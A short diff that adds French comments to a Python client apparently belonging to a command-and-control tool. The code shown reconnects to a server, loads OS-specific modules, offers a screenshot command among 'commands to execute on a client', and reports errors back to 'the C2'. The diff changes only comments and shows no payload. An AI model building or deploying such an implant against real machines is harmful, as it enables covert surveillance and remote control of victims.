@@ -8,7 +8,7 @@ import time
 import os
 
 ENCODING ="utf-8"
-RETRY_DELAY = 5
+RETRY_DELAY = 5 # 5s avant de re essayer une connexion
 
 #Config host serveur
 
@@ -26,7 +26,7 @@ SERVER_PORT= ARGS.port
 
 os_type = platform.system()
 
-#Detection de l'OS
+#Detection de l'OS et on charge le module qui correspond
 
 if os_type == "Windows":
     from modules.windows import *
@@ -87,7 +87,7 @@ def receiveMessage(sock) -> dict:
     return json.loads(data.decode(ENCODING))
 
 
-#Config des commandes exe
+#Config des commandes dispo à executer sur un client
 
 
 def cmd_screenshot(sock) -> None:
@@ -170,6 +170,7 @@ def handle_command(sock, msg: dict):
             })
 
     except Exception as e:
+        # on renvoie l'erreur au C2 sans que le client s'arrete
         send_msg(sock, {
             "status": "error",
             "message": str(e)
